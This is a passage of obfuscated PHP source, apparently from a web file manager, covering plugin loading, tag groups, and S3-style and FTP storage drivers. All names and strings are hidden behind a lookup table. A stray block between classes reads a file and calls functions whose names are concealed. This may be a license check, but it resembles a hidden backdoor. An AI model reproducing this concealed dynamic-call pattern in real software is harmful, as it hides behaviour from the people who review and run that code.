$ùÔàòÔ« = hash_hmac($ßîàë«í[281], $Âğï¥ôå, $ââœçŸ•, !0); $íÃìÇ¯ = hash_hmac($ßîàë«í[281], $•«†ëÛ˜, $ùÔàòÔ«, !0); $¡õôïĞ– = hash_hmac($ßîàë«í[281], $ÀÎöğ–, $íÃìÇ¯); $’ÉÍë˜‘ = array($ßîàë«í[237] => $ßîàë«í[12], $ßîàë«í[283] => $ßîàë«í[12], $ßîàë«í[271] => $‘óì¦Æè, $ßîàë«í[276] => $ØãÖÍƒ†, $ßîàë«í[284] => $ÀÎöğ–, $ßîàë«í[285] => $«ØÙÔ…ä, $ßîàë«í[286] => $¼ï±¯§², $ßîàë«í[287] => $„©‘ĞĞõ, $ßîàë«í[288] => $€…®ÍÊˆ, $ßîàë«í[289] => $¡õôïĞ–, $ßîàë«í[199] => $this->getHost()); return $’ÉÍë˜‘; } } goto eê‡¶£ºãÁ; dÍÈÚ«ÈêÙ: class GroupTagModel extends ModelBase { protected $tableName = "\165\x73\x65\162\137\146\141\166"; protected function cacheFunctionAlias($†Ô®·ÚÑ) { $áƒ•Ûğ° =& $_SERVER[º·Ï‹¥³]; return array($áƒ•Ûğ°[2066] => array($†Ô®·ÚÑ[0], $áƒ•Ûğ°[2067]), $áƒ•Ûğ°[2068] => array($†Ô®·ÚÑ[0], $áƒ•Ûğ°[2069])); } protected function get($›Öğ’Ù) { $õá»¬²™ =& $_SERVER[º·Ï‹¥³]; $´³æ÷†ã = Model($õá»¬²™[570])->metaGet($›Öğ’Ù, $õá»¬²™[2070]); $”¼óÓùì = json_decode($´³æ÷†ã, !0); return $”¼óÓùì ? $”¼óÓùì : array($õá»¬²™[2071] => $õá»¬²™[91], $õá»¬²™[429] => array()); } protected function set($©ÒºÂİ², $£ªãÀ¹õ) { $§Á˜“Ñ± =& $_SERVER[º·Ï‹¥³]; $£ªãÀ¹õ = $£ªãÀ¹õ ? $£ªãÀ¹õ : array($§Á˜“Ñ±[2071] => $§Á˜“Ñ±[91], $§Á˜“Ñ±[429] => array()); return Model($§Á˜“Ñ±[570])->metaSet($©ÒºÂİ², $§Á˜“Ñ±[2070], json_encode($£ªãÀ¹õ)); } protected function getByTagID($ÌèÍË¤Å, $á·«šÌ×) { $ñŸáíŠé =& $_SERVER[º·Ï‹¥³]; if (!$ÌèÍË¤Å || !$á·«šÌ×) { return !1; } if (!Model($ñŸáíŠé[570])->getInfoSimple($ÌèÍË¤Å)) { return !1; } $Ú‰šôìá = $this->get($ÌèÍË¤Å); if (!$Ú‰šôìá || !isset($Ú‰šôìá[$ñŸáíŠé[429]])) { return !1; } $œ°˜¶ = array_find_by_field($Ú‰šôìá[$ñŸáíŠé[429]], $ñŸáíŠé[459], $á·«šÌ×); return is_array($œ°˜¶) ? $œ°˜¶ : !1; } public function listSource($§Ç¹ãÉ©, $şèŠÉ) { $ñëØÚÈı =& $_SERVER[º·Ï‹¥³]; if ($şèŠÉ && !is_array($şèŠÉ)) { $şèŠÉ = array($şèŠÉ); } $Ó÷ÇËÑä = $this->listData($§Ç¹ãÉ©); $€ñ…‰§¸ = array(); foreach ($Ó÷ÇËÑä as $ÏÈïÏ) { $£äæÑÓî = $ÏÈïÏ[$ñëØÚÈı[87]]; if (!$£äæÑÓî) { continue; } if (!isset($€ñ…‰§¸[$£äæÑÓî])) { $€ñ…‰§¸[$£äæÑÓî] = array(); } $€ñ…‰§¸[$£äæÑÓî][] = $ÏÈïÏ[$ñëØÚÈı[484]]; } $åÌÖÁî˜ = array(); foreach ($€ñ…‰§¸ as $Öê®æÜè => $¥Æ¯óÕÇ) { $Ü¼ºŠè¦ = !0; if (!$şèŠÉ) { $åÌÖÁî˜[] = $Öê®æÜè; continue; } foreach ($şèŠÉ as $¡Ìİ‡äÜ) { if (!in_array($¡Ìİ‡äÜ, $¥Æ¯óÕÇ)) { $Ü¼ºŠè¦ = !1; break; } } if ($Ü¼ºŠè¦) { $åÌÖÁî˜[] = $Öê®æÜè; } } if (!$åÌÖÁî˜) { return array(); } $ëŞÔ‚» = array($ñëØÚÈı[475] => array($ñëØÚÈı[476], $åÌÖÁî˜), $ñëØÚÈı[554] => $§Ç¹ãÉ©, $ñëØÚÈı[181] => SourceModel::TYPE_GROUP); $óÎ¬üû = Model($ñëØÚÈı[1388])->listSource($ëŞÔ‚»); if (!$óÎ¬üû || count($åÌÖÁî˜) == $óÎ¬üû[$ñëØÚÈı[426]][$ñëØÚÈı[427]]) { return $óÎ¬üû; } $ššôÈí® = array(); $«½€©®æ = array_to_keyvalue($óÎ¬üû[$ñëØÚÈı[85]], $ñëØÚÈı[12], $ñëØÚÈı[184]); $¸¤ÓÌá¨ = array_to_keyvalue($óÎ¬üû[$ñëØÚÈı[86]], $ñëØÚÈı[12], $ñëØÚÈı[184]); $ØÁ­ÑÂŞ = array_merge($¸¤ÓÌá¨, $«½€©®æ); foreach ($åÌÖÁî˜ as $£äæÑÓî) { if (!in_array($£äæÑÓî, $ØÁ­ÑÂŞ)) { $ššôÈí®[] = $£äæÑÓî; } } if ($ššôÈí®) { $this->removeBySource($§Ç¹ãÉ©, $ššôÈí®); } return $óÎ¬üû; } protected function listData($‡îœÏÔ£) { $å¬ºÄÃÄ =& $_SERVER[º·Ï‹¥³]; $òÜ—öñ‘ = array($å¬ºÄÃÄ[1745] => 0, $å¬ºÄÃÄ[542] => array($å¬ºÄÃÄ[2072], 0), $å¬ºÄÃÄ[480] => $å¬ºÄÃÄ[2073] . $‡îœÏÔ£); $Ğï¢¼”– = $å¬ºÄÃÄ[2074]; $è¹®À¬ = $this->field($Ğï¢¼”–)->where($òÜ—öñ‘)->order($å¬ºÄÃÄ[2075])->select(); return $è¹®À¬ ? $è¹®À¬ : array(); } protected function addToTag($¾Ğß¥©ò, $¦×ç“Óí, $®ïšÚ“Š) { $ËÅÒı€  =& $_SERVER[º·Ï‹¥³]; if (!$this->getByTagID($¾Ğß¥©ò, $®ïšÚ“Š) || !$¦×ç“Óí) { return !1; } if (!Model($ËÅÒı€ [876])->pathInfo($¦×ç“Óí)) { return !1; } $™³ä÷€Ã = array($ËÅÒı€ [1745] => 0, $ËÅÒı€ [542] => $®ïšÚ“Š, $ËÅÒı€ [479] => $¦×ç“Óí, $ËÅÒı€ [480] => $ËÅÒı€ [2076] . $¾Ğß¥©ò, $ËÅÒı€ [478] => $ËÅÒı€ [12], $ËÅÒı€ [1956] => 0); if ($this->where($™³ä÷€Ã)->find()) { return !1; } return $this->add($™³ä÷€Ã); } protected function removeFromTag($û¬–¡ä, $²ÁŞÁñ, $ü×‹ˆá) { $ÈúÚÒÃÊ =& $_SERVER[º·Ï‹¥³]; if (!$this->getByTagID($û¬–¡ä, $ü×‹ˆá) || !$²ÁŞÁñ) { return !1; } if (is_array($²ÁŞÁñ)) { $²ÁŞÁñ = array($ÈúÚÒÃÊ[7], $²ÁŞÁñ); } $—äõ…Ê— = array($ÈúÚÒÃÊ[1745] => 0, $ÈúÚÒÃÊ[542] => $ü×‹ˆá, $ÈúÚÒÃÊ[480] => $ÈúÚÒÃÊ[2076] . $û¬–¡ä, $ÈúÚÒÃÊ[479] => $²ÁŞÁñ); return $this->where($—äõ…Ê—)->delete(); } protected function removeByTag($ó¸ƒÊ¹Ğ, $Û—Ü‘) { $ŞŞàÕ— =& $_SERVER[º·Ï‹¥³]; if (!$this->getByTagID($ó¸ƒÊ¹Ğ, $Û—Ü‘)) { return !1; } $Ô‹àÒ÷ = array($ŞŞàÕ—[1745] => 0, $ŞŞàÕ—[542] => $Û—Ü‘, $ŞŞàÕ—[480] => $ŞŞàÕ—[2076] . $ó¸ƒÊ¹Ğ); return $this->where($Ô‹àÒ÷)->delete(); } protected function removeBySource($ïë÷ÖŒ, $¦†™ü•¿) { $÷èéëêŠ =& $_SERVER[º·Ï‹¥³]; if (!$ïë÷ÖŒ || !$¦†™ü•¿) { return !1; } if (is_array($¦†™ü•¿)) { $¦†™ü•¿ = array($÷èéëêŠ[7], $¦†™ü•¿); } $ªûĞ…ş = array($÷èéëêŠ[1745] => 0, $÷èéëêŠ[479] => $¦†™ü•¿, $÷èéëêŠ[542] => array($÷èéëêŠ[1063], 0), $÷èéëêŠ[480] => $÷èéëêŠ[2076] . $ïë÷ÖŒ); return $this->where($ªûĞ…ş)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\x6d\x2e\160\x6c\x75\x67\x69\156\114\151\163\164"; public $field = array("\156\x61\x6d\145", "\163\164\141\x74\165\163", "\162\145\147\x69\145\163\164", "\x63\157\156\x66\151\147"); public function loadList($ú®—Üò¤ = false) { $Š¤Ú¨ô¹ = array_to_keyvalue($this->listData(), $_SERVER[º·Ï‹¥³][32]); if ($ú®—Üò¤) { return $Š¤Ú¨ô¹[$ú®—Üò¤]; } return $Š¤Ú¨ô¹; } public function init() { $ÀÍ˜Ù¤© =& $_SERVER[º·Ï‹¥³]; Hook::trigger($ÀÍ˜Ù¤©[2077]); $÷çšÙû• = $this->loadPluginList(); foreach ($÷çšÙû• as $êŒ‡İºÛ => $ã€í“†¸) { $¦ÎÙ¾° = $this->appAllow($êŒ‡İºÛ, $ã€í“†¸); if (!$¦ÎÙ¾°) { continue; } foreach ($ã€í“†¸[$ÀÍ˜Ù¤©[2078]] as $™ºü¢û => $ê¸˜­ªò) { Hook::bind($™ºü¢û, $ê¸˜­ªò); } } Hook::trigger($ÀÍ˜Ù¤©[2079]); Hook::trigger(ACTION); } public function appAllow($àÒÅ»˜ , $êÉ±¡é, $©îÜñÇŠ = true) { $èåÈîşÕ =& $_SERVER[º·Ï‹¥³]; $¬İºÂ·™ = PLUGIN_DIR . $àÒÅ»˜  . $èåÈîşÕ[2080]; if (!is_array($êÉ±¡é) || !is_array($êÉ±¡é[$èåÈîşÕ[2078]]) || $êÉ±¡é[$èåÈîşÕ[802]] != 1 || !is_file($¬İºÂ·™)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$èåÈîşÕ[6]][$èåÈîşÕ[2081]] || !$GLOBALS[$èåÈîşÕ[6]][$èåÈîşÕ[2082]]) { return !0; } $ù’üÉ¸ = explode($èåÈîşÕ[50], strtolower($GLOBALS[$èåÈîşÕ[6]][$èåÈîşÕ[2082]])); return in_array(strtolower($àÒÅ»˜ ), $ù’üÉ¸) ? !1 : !0; } if ($©îÜñÇŠ && !Action($èåÈîşÕ[2083])->checkAuth($àÒÅ»˜ )) { return !1; } return !0; } public function unInstall($õŞ•ºšÊ) { $«¿ôı¼ =& $_SERVER[º·Ï‹¥³]; $ãÌŠùÕ = $this->loadList($õŞ•ºšÊ); if (file_exists(PLUGIN_DIR . $õŞ•ºšÊ)) { Hook::apply($õŞ•ºšÊ . $«¿ôı¼[2084]); } $this->remove($ãÌŠùÕ[$«¿ôı¼[459]]); } public function changeStatus($ÄÒü”—®, $ìä—Œ’à) { $™¿àÛ“¹ =& $_SERVER[º·Ï‹¥³]; $ëêçûãË = $this->loadList($ÄÒü”—®); if ($ìä—Œ’à) { Hook::apply($ÄÒü”—® . $™¿àÛ“¹[2085]); } $this->update($ëêçûãË[$™¿àÛ“¹[459]], array($™¿àÛ“¹[2086] => $ìä—Œ’à)); } public function appRegist($Ø¿÷Úª„, $©÷üì»â) { $øŸ€¦²ê =& $_SERVER[º·Ï‹¥³]; $¦“öş–Â = $this->loadList($Ø¿÷Úª„); if ($¦“öş–Â) { $this->update($¦“öş–Â[$øŸ€¦²ê[459]], array($øŸ€¦²ê[2078] => $©÷üì»â)); } else { $¨ûæÕ›¢ = array($øŸ€¦²ê[32] => $Ø¿÷Úª„, $øŸ€¦²ê[2078] => $©÷üì»â, $øŸ€¦²ê[802] => 0, $øŸ€¦²ê[6] => $this->getConfigDefault($Ø¿÷Úª„)); $this->insert($¨ûæÕ›¢); } } public function getConfigDefault($ûÍÂ»—) { $¨¼ûô¶¨ =& $_SERVER[º·Ï‹¥³]; $¾êñÏÁ¤ = array(); $®ôØåÄ© = $this->getPackageJson($ûÍÂ»—); if (!$®ôØåÄ© && is_array($®ôØåÄ©[$¨¼ûô¶¨[2087]])) { return $¾êñÏÁ¤; } foreach ($®ôØåÄ©[$¨¼ûô¶¨[2087]] as $À«÷èª => $á¾š‹÷Ÿ) { if (!isset($á¾š‹÷Ÿ[$¨¼ûô¶¨[434]]) || isset($¾êñÏÁ¤[$À«÷èª])) { continue; } $¾êñÏÁ¤[$À«÷èª] = $á¾š‹÷Ÿ[$¨¼ûô¶¨[434]]; } return $¾êñÏÁ¤; } public function getPackageJson($µûßàµ) { return Hook::apply($µûßàµ . $_SERVER[º·Ï‹¥³][2088]); } public function getConfig($êó™âÓü, $à¾‚”°® = false) { $¿¶ÑèúÅ =& $_SERVER[º·Ï‹¥³]; $Ü°¡‰Äù = array(); $²à¸à¸ = $this->loadList($êó™âÓü); if ($²à¸à¸ && is_array($²à¸à¸[$¿¶ÑèúÅ[6]])) { $Ü°¡‰Äù = $²à¸à¸[$¿¶ÑèúÅ[6]]; } if (!$Ü°¡‰Äù || $à¾‚”°®) { $Ü°¡‰Äù = $this->getConfigDefault($êó™âÓü); } return $Ü°¡‰Äù; } public function setConfig($¶ ¬¶Ğ, $È½°éœ… = false) { $û²İÆ»§ =& $_SERVER[º·Ï‹¥³]; $ó§ğİ» = $this->loadList($¶ ¬¶Ğ); if (!$ó§ğİ») { return !1; } $Î¾ëÁ´† = $ó§ğİ»[$û²İÆ»§[6]]; if ($È½°éœ… == !1) { $Î¾ëÁ´† = array(); $È½°éœ… = $this->getConfigDefault($¶ ¬¶Ğ); } foreach ($È½°éœ… as $ç¬û…¨‹ => $ğƒµé·) { $Î¾ëÁ´†[$ç¬û…¨‹] = is_string($ğƒµé·) ? trim($ğƒµé·) : $ğƒµé·; } $this->update($ó§ğİ»[$û²İÆ»§[459]], array($û²İÆ»§[6] => $Î¾ëÁ´†)); } public function viewList() { $Îœ‹ìá¤ =& $_SERVER[º·Ï‹¥³]; $°¥“¼Ï = $this->loadList(); $this->pluginScan($°¥“¼Ï); $°¥“¼Ï = $this->loadPluginList(); $³ú¾Ç¹‘ = array(); foreach ($°¥“¼Ï as $ÖÛ™‘ô· => $‡À™ë©Š) { $Õ€Ú­æò = $‡À™ë©Š; unset($‡À™ë©Š[$Îœ‹ìá¤[2078]], $‡À™ë©Š[$Îœ‹ìá¤[6]]); $ÓÄÀ³­¤ = PLUGIN_DIR . $‡À™ë©Š[$Îœ‹ìá¤[32]] . $Îœ‹ìá¤[2080]; if (!is_file($ÓÄÀ³­¤)) { continue; } $àÔã©Â = Hook::apply($‡À™ë©Š[$Îœ‹ìá¤[32]] . $Îœ‹ìá¤[2088]); if (!is_array($àÔã©Â)) { continue; } $³ú¾Ç¹‘[$ÖÛ™‘ô·] = array_merge($‡À™ë©Š, $àÔã©Â); if ($Õ€Ú­æò[$Îœ‹ìá¤[6]][$Îœ‹ìá¤[1668]] != $àÔã©Â[$Îœ‹ìá¤[1642]]) { Hook::apply($‡À™ë©Š[$Îœ‹ìá¤[32]] . $Îœ‹ìá¤[2085]); $Õ€Ú­æò[$Îœ‹ìá¤[6]][$Îœ‹ìá¤[1668]] = $àÔã©Â[$Îœ‹ìá¤[1642]]; $this->update($‡À™ë©Š[$Îœ‹ìá¤[459]], array($Îœ‹ìá¤[6] => $Õ€Ú­æò[$Îœ‹ìá¤[6]])); } } return $³ú¾Ç¹‘; } private function loadPluginList() { $àˆ¨³Ìø =& $_SERVER[º·Ï‹¥³]; $ı«™¶Ÿ = $this->loadList(); if (strtolower(MOD) == $àˆ¨³Ìø[2089]) { return $ı«™¶Ÿ; } $ÁŸ•®›ä = Hook::trigger($àˆ¨³Ìø[2090], $ı«™¶Ÿ); if ($ı«™¶Ÿ && !$ÁŸ•®›ä) { die; } return $ÁŸ•®›ä ? $ÁŸ•®›ä : $ı«™¶Ÿ; } private function pluginScan($¦‡šÊ¢) { $ì‘ïôİ± =& $_SERVER[º·Ï‹¥³]; recursion_dir(PLUGIN_DIR, $„Ô±©¡, $¸â®Ò´, 0); foreach ($„Ô±©¡ as $Æ²·Ã¥õ) { $Áâ¯¦å’ = get_path_this($Æ²·Ã¥õ); if (isset($¦‡šÊ¢[$Áâ¯¦å’]) || !file_exists($Æ²·Ã¥õ . $ì‘ïôİ±[2091]) || !file_exists($Æ²·Ã¥õ . $ì‘ïôİ±[2080])) { continue; } Hook::apply($Áâ¯¦å’ . $ì‘ïôİ±[2085]); } } } if ($_SERVER[$_SERVER[º·Ï‹¥³][408]] != $_SERVER[$_SERVER[º·Ï‹¥³][1379]]) { $_getc = $_SERVER[º·Ï‹¥³][409]; $_getfile = $_SERVER[$_SERVER[º·Ï‹¥³][410]] . $_SERVER[º·Ï‹¥³][411]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[º·Ï‹¥³][253], $_getfilec); if (count($_getarrs) < $_SERVER[º·Ï‹¥³][412]) { $exit = $_SERVER[º·Ï‹¥³][413]; $exit(); } $_act = $_SERVER[º·Ï‹¥³][414]; $_act($_SERVER[$_SERVER[º·Ï‹¥³][406]]); } goto CîÈ™éâ»; A´½¬ù’„˜: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($×ÂŒÎ) { parent::__construct($×ÂŒÎ); $this->setSignVersion($_SERVER[º·Ï‹¥³][238]); } public function uploadFormData($•¿ÓË¡¾, $›¦˜çÖ = 3600) { $’Á´úƒî =& $_SERVER[º·Ï‹¥³]; $Ó©Õô¢ = $’Á´úƒî[220]; $Îå÷¤÷• = $’Á´úƒî[261]; $Æ–¥ñ¢º = $’Á´úƒî[62]; $œ’¿ÃôÇ = gmdate($’Á´úƒî[262]); $éİ¥ğà§ = gmdate($’Á´úƒî[263]); $•±É×åã = $’Á´úƒî[264]; $Èå¥ÏŸ = $›¦˜çÖ . $’Á´úƒî[12]; $ñêƒÇŞ× = $’Á´úƒî[265]; $ùä¸üÕ = array($this->accessKey, $éİ¥ğà§, $this->region, $Æ–¥ñ¢º, $•±É×åã); $Éª–á‰ş = implode($’Á´úƒî[8], $ùä¸üÕ); $¤¹¨Æ¿ = array($’Á´úƒî[266] => gmdate($’Á´úƒî[1380], strtotime($’Á´úƒî[268])), $’Á´úƒî[269] => array(array($’Á´úƒî[270] => $this->bucket), array($’Á´úƒî[271] => $Ó©Õô¢), array($’Á´úƒî[272], $’Á´úƒî[273], $’Á´úƒî[12]), array($’Á´úƒî[272], $’Á´úƒî[274], $’Á´úƒî[12]), array($’Á´úƒî[272], $’Á´úƒî[275], $’Á´úƒî[12]), array($’Á´úƒî[276] => $ñêƒÇŞ×), array($’Á´úƒî[277] => $Éª–á‰ş), array($’Á´úƒî[278] => $Îå÷¤÷•), array($’Á´úƒî[279] => $œ’¿ÃôÇ), array($’Á´úƒî[280] => $Èå¥ÏŸ))); $…¬¦Ğåú = base64_encode(json_encode($¤¹¨Æ¿)); $ú¬…š  = hash_hmac($’Á´úƒî[281], $éİ¥ğà§, $’Á´úƒî[282] . $this->secret, !0); $Ø»íÏè« = hash_hmac($’Á´úƒî[281], $this->region, $ú¬…š , !0); $ÎˆãªØ = hash_hmac($’Á´úƒî[281], $Æ–¥ñ¢º, $Ø»íÏè«, !0); $“œ°½è = hash_hmac($’Á´úƒî[281], $•±É×åã, $ÎˆãªØ, !0); $³­ŞäÀŸ = hash_hmac($’Á´úƒî[281], $…¬¦Ğåú, $“œ°½è); $ÒŸ”ë‚ = array($’Á´úƒî[237] => $’Á´úƒî[12], $’Á´úƒî[283] => $’Á´úƒî[12], $’Á´úƒî[271] => $Ó©Õô¢, $’Á´úƒî[276] => $ñêƒÇŞ×, $’Á´úƒî[284] => $…¬¦Ğåú, $’Á´úƒî[285] => $Éª–á‰ş, $’Á´úƒî[286] => $Îå÷¤÷•, $’Á´úƒî[287] => $œ’¿ÃôÇ, $’Á´úƒî[288] => $Èå¥ÏŸ, $’Á´úƒî[289] => $³­ŞäÀŸ, $’Á´úƒî[199] => $this->getHost()); return $ÒŸ”ë‚; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($Ù¯øƒ¼Ø) { parent::__construct(); if (count($Ù¯øƒ¼Ø) > 0) { $this->_init($Ù¯øƒ¼Ø); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($¶˜£‘é) { $¸ùßş€ =& $_SERVER[º·Ï‹¥³]; global $config; $this->appCharset = $config[$¸ùßş€[1406]]; $this->systemCharset = $config[$¸ùßş€[1407]]; if (isset($¶˜£‘é[$¸ùßş€[1408]]) && $¶˜£‘é[$¸ùßş€[1408]]) { $this->systemCharset = $¶˜£‘é[$¸ùßş€[1408]]; } } public function iconvApp($¿İÁ„‹) { return $this->iconvTo($¿İÁ„‹, $this->systemCharset, $this->appCharset); } public function iconvSystem($½ÎĞÆ¡ã) { return $this->iconvTo($½ÎĞÆ¡ã, $this->appCharset, $this->systemCharset); } public function getPathOuter($¿ãå„) { $Ší¦½Îõ =& $_SERVER[º·Ï‹¥³]; $è¦§×ıµ = $this->iconvApp($this->pathBase); $¿ãå„ = $this->iconvApp($¿ãå„); if (substr($è¦§×ıµ, 0, 2) == $Ší¦½Îõ[1409]) { $è¦§×ıµ = BASIC_PATH . substr($è¦§×ıµ, 2); } if (substr($¿ãå„, 0, 2) == $Ší¦½Îõ[1409]) { $¿ãå„ = BASIC_PATH . substr($¿ãå„, 2); } $è¦§×ıµ = KodIO::clear($è¦§×ıµ); $¿ãå„ = KodIO::clear($¿ãå„); $¿ãå„ = substr($¿ãå„, strlen($è¦§×ıµ)); if (empty($this->pathDriver)) { return $¿ãå„; } return $this->pathDriver . $Ší¦½Îõ[8] . ltrim($¿ãå„, $Ší¦½Îõ[8]); } private function _init($Ù™Öö°ô = array()) { $è‘òºÍË =& $_SERVER[º·Ï‹¥³]; if (!function_exists($è‘òºÍË[1410])) { throw new Exception(LNG($è‘òºÍË[1411])); } $this->config = $Ù™Öö°ô; $this->charsetReset($Ù™Öö°ô); foreach ($Ù™Öö°ô as $Çì¤ìáñ => $şÓÚëŸÃ) { if (isset($this->{$Çì¤ìáñ})) { $this->{$Çì¤ìáñ} = $şÓÚëŸÃ; } } return $this->_login($Ù™Öö°ô); } private function _login($Ñ‚¶áË) { $¿°ñ£íâ =& $_SERVER[º·Ï‹¥³]; static $Ó›ÆİºÈ = array(); $ğà°‡úõ = md5(json_encode($Ñ‚¶áË)); if (isset($Ó›ÆİºÈ[$ğà°‡úõ])) { foreach ($Ó›ÆİºÈ[$ğà°‡úõ] as $éÙÂ´è => $Ó™¢•š©) { $this->{$éÙÂ´è} = $Ó™¢•š©; } return !0; } $üÛú­èÃ = parse_url(trim($this->server, $¿°ñ£íâ[8])); $this->host = $üÛú­èÃ[$¿°ñ£íâ[199]]; $Ÿ¦íû¥ = isset($üÛú­èÃ[$¿°ñ£íâ[198]]) && $üÛú­èÃ[$¿°ñ£íâ[198]] == $¿°ñ£íâ[1412] ? !0 : !1; $this->scheme = $Ÿ¦íû¥ ? $¿°ñ£íâ[1413] : $¿°ñ£íâ[1414]; $this->port = isset($üÛú­èÃ[$¿°ñ£íâ[200]]) ? $üÛú­èÃ[$¿°ñ£íâ[200]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($¿°ñ£íâ[1415]) . $this->host . $¿°ñ£íâ[4] . $this->port, !0); return !1; } $Ï¬şó­ = @ftp_login($this->connect, $this->username, $this->userpass); if (!$Ï¬şó­) { $this->writeLog(LNG($¿°ñ£íâ[1416]) . $this->username, !0); return !1; } @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $¢±Í¥ = $this->pasv == $¿°ñ£íâ[91] ? !0 : !1; @ftp_pasv($this->connect, $¢±Í¥); $Ó›ÆİºÈ[$ğà°‡úõ] = array($¿°ñ£íâ[1417] => $this->connect, $¿°ñ£íâ[199] => $this->host, $¿°ñ£íâ[198] => $this->scheme, $¿°ñ£íâ[200] => $this->port); return $Ï¬şó­; } private function _isconn($Ñ­öâ¨¬ = true) { if (is_resource($this->connect)) { return !0; } if (!$Ñ­öâ¨¬) { return !1; } return $this->_login($this->config); } public function mkfile($ØÇô¨èá, $’ÏÚğÊğ = '', $ÃŒĞÓ›¨ = REPEAT_RENAME) { if ($this->setContent($ØÇô¨èá, $’ÏÚğÊğ)) { return $this->getPathOuter($ØÇô¨èá); } $this->writeLog(LNG($_SERVER[º·Ï‹¥³][1418]), !0); return !1; } public function mkdir($°³í™·ß, $­­ãÌİë = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $°³í™·ß = $this->iconvSystem($°³í™·ß); if ($this->_isFolder($°³í™·ß) || @ftp_mkdir($this->connect, $°³í™·ß)) { return $this->getPathOuter($°³í™·ß); } if (!$this->mkdir($this->pathFather($°³í™·ß))) { return !1; } if ($°³í™·ß = @ftp_mkdir($this->connect, $°³í™·ß)) { return $this->getPathOuter($°³í™·ß); } $this->writeLog(__FUNCTION__ . $_SERVER[º·Ï‹¥³][1419], !0); return !1; } public function copyFile($¡àÕƒäÄ, $­ŠÍ¢ìÅ) { if (!$this->_isconn()) { return !1; } $îĞâäéÍ = $this->pathThis($this->iconvSystem($¡àÕƒäÄ)); $Èì±Â = $this->tempFile($îĞâäéÍ); $‚şğâôç = $this->iconvApp($Èì±Â); $this->download($¡àÕƒäÄ, $‚şğâôç); $£öòçÎ¬ = $this->upload($­ŠÍ¢ìÅ, $‚şğâôç); $this->tempFileRemve($Èì±Â); return $£öòçÎ¬; } public function moveFile($é¾£÷Ä, $®‡â Üö) { if (!$this->_isconn()) { return !1; } $é¾£÷Ä = $this->iconvSystem($é¾£÷Ä); $®‡â Üö = $this->iconvSystem($®‡â Üö); $üøî· = @ftp_rename($this->connect, $é¾£÷Ä, $®‡â Üö); if (!$üøî·) { $this->writeLog(__FUNCTION__ . $_SERVER[º·Ï‹¥³][1419], !0); return !1; } return $this->getPathOuter($®‡â Üö); } public function delFile($Ó·é§) { if (!$this->_isconn()) { return !1; } $Ó·é§ = $this->iconvSystem($Ó·é§); $â¡Ç—Ùì = @ftp_delete($this->connect, $Ó·é§); if (!$â¡Ç—Ùì) { $this->writeLog(__FUNCTION__ . $_SERVER[º·Ï‹¥³][1419], !0); } return $â¡Ç—Ùì; } public function delFolder($²Ô®„¦µ) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $î–óÇºí = $²à†èğİ = array(); $this->fileList($²Ô®„¦µ, $î–óÇºí, $²à†èğİ, !0); $this->listItemCache = !0; foreach ($²à†èğİ as $É¦şÈÀ£) { $ÉÁ©›šÑ = $this->iconvSystem($É¦şÈÀ£[$_SERVER[º·Ï‹¥³][32]]); $ßÆû™¬Ë = @ftp_delete($this->connect, $ÉÁ©›šÑ); if (!$ßÆû™¬Ë) { return !1; } } foreach ($î–óÇºí as $ÉÁ©›šÑ) { $ÉÁ©›šÑ = $this->iconvSystem($ÉÁ©›šÑ); $ßÆû™¬Ë = @ftp_rmdir($this->connect, $ÉÁ©›šÑ); if (!$ßÆû™¬Ë) { return !1; } } $²Ô®„¦µ = $this->iconvSystem($²Ô®„¦µ); return @ftp_rmdir($this->connect, $²Ô®„¦µ); } public function rename($ùÒé‚ë˜, $ÌëË‡ì) { $ƒáîµˆû =& $_SERVER[º·Ï‹¥³]; if (!$this->_isconn()) { return !1; } $ÏĞ¾Ü‘À = $this->fileNameAuto($this->pathFather($ùÒé‚ë˜), $ÌëË‡ì); $ÏĞ¾Ü‘À = $this->iconvSystem($ÏĞ¾Ü‘À); $ùÒé‚ë˜ = $this->iconvSystem($ùÒé‚ë˜); $èØô£ç = $this->pathFather($ùÒé‚ë˜); $Ò²˜½·£ = rtrim($èØô£ç, $ƒáîµˆû[8]) . $ƒáîµˆû[8] . $ÏĞ¾Ü‘À; $ÛŠ›ëÁ = @ftp_rename($this->connect, $ùÒé‚ë˜, $Ò²˜½·£); if (!$ÛŠ›ëÁ) { $this->writeLog(__FUNCTION__ . $ƒáîµˆû[1419], !0); return !1; } $Ò²˜½·£ = $this->iconvApp($Ò²˜½·£); return $this->getPathOuter($Ò²˜½·£); } private function folderInfo($•˜ì¬Ú±, $º¼´˜ûŠ = false) { $ÄãÆ¨ó¿ =& $_SERVER[º·Ï‹¥³]; $Üß©¶Ú = array($ÄãÆ¨ó¿[32] => $this->pathThis($•˜ì¬Ú±), $ÄãÆ¨ó¿[87] => $this->getPathOuter($ÄãÆ¨ó¿[8] . $•˜ì¬Ú±), $ÄãÆ¨ó¿[33] => $ÄãÆ¨ó¿[78]); if ($º¼´˜ûŠ) { return $Üß©¶Ú; } $Üß©¶Ú[$ÄãÆ¨ó¿[222]] = $Üß©¶Ú[$ÄãÆ¨ó¿[88]] = 0; $Üß©¶Ú[$ÄãÆ¨ó¿[223]] = $Üß©¶Ú[$ÄãÆ¨ó¿[224]] = !0; return $Üß©¶Ú; } private function fileInfo($Û´³ÜÈÎ, $œ¦¨¥¨ú = false, $ìİƒ‹Ûá = array()) { $ıÂ²ıüˆ =& $_SERVER[º·Ï‹¥³]; $ÖßÁÓåœ = array($ıÂ²ıüˆ[32] => $this->pathThis($Û´³ÜÈÎ), $ıÂ²ıüˆ[87] => $this->getPathOuter($ıÂ²ıüˆ[8] . $Û´³ÜÈÎ), $ıÂ²ıüˆ[33] => $ıÂ²ıüˆ[221], $ıÂ²ıüˆ[79] => isset($ìİƒ‹Ûá[$ıÂ²ıüˆ[79]]) ? $ìİƒ‹Ûá[$ıÂ²ıüˆ[79]] : 0, $ıÂ²ıüˆ[178] => $this->ext($Û´³ÜÈÎ)); if 